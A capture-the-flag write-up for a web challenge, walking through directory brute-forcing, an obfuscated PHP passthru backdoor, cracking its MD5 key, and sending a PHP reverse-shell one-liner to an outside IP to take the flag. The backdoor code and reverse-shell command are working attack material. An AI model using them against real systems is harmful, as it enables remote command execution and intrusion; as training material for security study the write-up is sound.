# Challenge Name: Arcade Game


![date](https://img.shields.io/badge/date-17.04.2022-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)   
![category](https://img.shields.io/badge/category-WEB-blueviolet.svg)   
![value](https://img.shields.io/badge/value-150-blue.svg)  


## Description

A group of hackers succeeded to own our lovely arcade machine, till now we have no idea how or when but we are sure that they will come back, due to our analysis we think there's a backdoor, try to find it for us and read the flag.

[https://thnbdarija-arcade.chals.io/](https://thnbdarija-arcade.chals.io/)

_Author : EddieMora_


## Detailed solution  

Start by checking the website 

![image](https://user-images.githubusercontent.com/72421091/163740676-92c18d66-4575-4fbf-b341-cde1bbf0c4f7.png)

Source page has nothing interesting

Let's check for known files and do some directory bruteforcing 

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/dirb/wordlists/big.txt -t 20 -u https://thnbdarija-arcade.chals.io/ -e php,txt,js
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://thnbdarija-arcade.chals.io/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/dirb/wordlists/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2022/04/17 04:55:49 Starting gobuster in directory enumeration mode
===============================================================
https://thnbdarija-arcade.chals.io/.htpasswd            (Status: 403) [Size: 291]
https://thnbdarija-arcade.chals.io/.htaccess            (Status: 403) [Size: 291]
https://thnbdarija-arcade.chals.io/README               (Status: 200) [Size: 377]
https://thnbdarija-arcade.chals.io/css                  (Status: 301) [Size: 338][--> http://thnbdarija-arcade.chals.io/css/]
https://thnbdarija-arcade.chals.io/img                  (Status: 301) [Size: 338][--> http://thnbdarija-arcade.chals.io/img/]
https://thnbdarija-arcade.chals.io/js                   (Status: 301) [Size: 337][--> http://thnbdarija-arcade.chals.io/js/]
https://thnbdarija-arcade.chals.io/robots.txt           (Status: 200) [Size: 485]             
https://thnbdarija-arcade.chals.io/server-status        (Status: 403) [Size: 291]             
                                                                                                                                   
===============================================================
2022/04/17 04:58:26 Finished
===============================================================

```

- https://thnbdarija-arcade.chals.io/robots.txt the only accessible files are /README and /hint.txt
```
User-agent: Applebot
Disallow: /ajax/
Disallow: /album.php
Disallow: /checkpoint/
Disallow: /contact_importer/
Disallow: /dialog/
Disallow: /fbml/ajax/dialog/
Disallow: /feeds/
Disallow: /file_download.php
Disallow: /job_application/
Disallow: /l.php
Disallow: /moments_app/
Disallow: /p.php
Disallow: /photo.php
Disallow: /photos.php
Disallow: /plugins/
Disallow: /share.php
Disallow: /share/
Disallow: /sharer.php
Disallow: /sharer/
Disallow: /tr/
Disallow: /tr?
Disallow: /hint.txt
```

- https://thnbdarija-arcade.chals.io/README it shows the source code for a backdoor 

```php
<?php
$X = chr(0x73);
$R = chr(0x72);
$F = chr(0x75);

$cGFzc3dvcmQ = "b02dc9b178659a6ea480d72c94713469"; //password123@!
$owner = "logic";

//flag{try_h4rd3r_1337}

$B = chr(0x61);
$E = chr(0x68);
$D = chr(0x74);
$A = chr(0x70);

$hook = $A.$B.$X.$X.$D.$E.$R.$F;

if($cGFzc3dvcmQ === md5($_GET['key']) && $owner === $_GET['hint'])
{
  $hook($_GET['zip']);
}
else
{
  die();
}
```
### Analyzing the source code 

- $hook is the `passthru` function 
- we need to find the original string for this md5 hash "b02dc9b178659a6ea480d72c94713469"
- To execute a command using the backdoor, we need to send /?key=S&hint=logic&zip=command

Now we need to find the key. we have the file hint.txt that has some passwords

```
["password", 123456, 12345678, 1234, "qwerty", 12345, "dragon", "pussy", "baseball", "football", "letmein", "monkey", 696969, "abc123", "mustang", "michael", "shadow", "master", "jennifer", 111111, 2000, "jordan", "superman", "harley", 1234567, "fuckme", "hunter", "fuckyou", "trustno1", "ranger", "buster", "thomas", "tigger", "robert", "soccer", "fuck", "batman", "test", "pass", "killer", "hockey", "george", "charlie", "andrew", "michelle", "love", "sunshine", "jessica", "asshole", 6969, "pepper", "daniel", "access", 123456789, 654321, "joshua", "maggie", "starwars", "silver", "william", "dallas", "3waba1337@!", 123123, "ashley", 666666, "hello", "amanda", "orange", "biteme", "freedom", "computer", "sexy", "thunder", "nicole", "ginger", "heather", "hammer", "summer", "corvette", "taylor", "fucker", "austin", 1111]
```

After trying the md5 of those passwords, I found the one needed

MD5(3waba1337@!) = b02dc9b178659a6ea480d72c94713469

Now the backdoor command is /?key=3waba1337@!&hint=logic&zip=command

Now we need to find the backdoor location, I changed to the diresearch default wordlist and retry bruteforcing

I found the backdoor /admin.php 

Now let's send the full command. I used the php reverse shell (bash didn't work) 

```
php -r '$sock=fsockopen("18.158.249.75",19145);exec("bash <&3 >&3 2>&3");'
```

```
https://thnbdarija-arcade.chals.io/admin.php?key=3waba1337%40%21&hint=logic&zip=php%20-r%20%27%24sock%3Dfsockopen%28%2218.158.249.75%22%2C19145%29%3Bexec%28%22bash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```

I got the reverse shell 

![image](https://user-images.githubusercontent.com/72421091/163742024-53625e1e-2c55-4cdd-be54-036e2ea8ffdf.png)

The box dosen't have python so I used script to stabilize the shell `/usr/bin/script -qc /bin/bash /dev/null`

Checking the home directory, i found a user called ctf with a file .flag inside his home directory 

![image](https://user-images.githubusercontent.com/72421091/163742333-7341fdd8-cb35-449a-9609-135fe4942ea1.png)

### Flag

```
thnb{Th4nkS_f0r_s4v1ng_Th3_4rC4d3_M4ch1n3}
```
